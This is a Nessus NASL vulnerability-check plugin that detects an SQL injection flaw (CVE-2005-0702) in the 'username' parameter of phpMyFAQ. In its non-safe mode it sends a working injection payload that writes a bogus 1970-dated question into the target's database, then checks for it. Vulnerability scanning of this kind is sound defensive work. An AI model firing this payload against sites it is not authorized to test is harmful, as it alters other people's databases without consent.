#
# (C) Tenable Network Security
#


if (description) {
  script_id(17298);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-0702");
  script_bugtraq_id(12741);

  name["english"] = "phpMyFAQ username SQL Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis : 

The remote web server contains a PHP script that allows for SQL
injection attacks. 

Description : 

The remote host is running a version of phpMyFAQ that fails to
sufficiently sanitize the 'username' parameter before using it in SQL
queries.  As a result, a remote attacker can pass malicious input to
database queries, potentially resulting in data exposure, data
modification, or attacks against the database itself. 

See also : 

http://www.phpmyfaq.de/advisory_2005-03-06.php

Solution : 

Upgrade to phpMyFAQ version 1.4.7 or 1.5.0 RC2 or greater.

Risk factor : 

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for username SQL injection vulnerability in phpMyFAQ";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("phpmyfaq_detect.nasl", "smtp_settings.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpmyfaq"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  if (safe_checks()) {
    # nb: the advisory claims this only affects 1.4 and 1.5 versions;
    #     should we extend it to all earlier versions???
    if (ver =~ "^1\.(4\.[0-6]|5\.0 RC1)") security_warning(port);
  }
  else {
    # The code in savequestion.php takes the date as the current date/time
    # when adding a question. Let's see if we can exploit the vulnerability
    # to add a question with a bogus date -- 01/01/1970.
    #
    # nb: although some sites don't seem to advertise the "Add a Question"
    #     link, specifying action=savequestion does seem active.
    email = get_kb_item("SMTP/headers/From");
    if (!email) email = "nobody@example.com";
    req = http_get(
      item:string(
        dir, "/index.php?",
        "action=savequestion&",
        "username=n/a','", email, "','','n/a','19700101000000')%20--%20'&",
        # nb: usermail and content will be ignored if the exploit works.
        "usermail=x@y.com&",
        "content=Hi"
      ),
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req);
    if (res == NULL) exit(0);

    # Find our question amongst the list of open questions.
    #
    # nb: there only ever seems to be one page generated, and even so,
    #     a date of 1970 ensures ours will be among the first.
    req = http_get(item:string(dir, "/index.php?action=open"), port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    email = str_replace(string:email, find:"@", replace:"_AT_");
    email = str_replace(string:email, find:".", replace:"_DOT_");
    if (egrep(string:res, pattern:string('1970.*<br.+ href="mailto:', email))) 
      security_warning(port);
  }
}
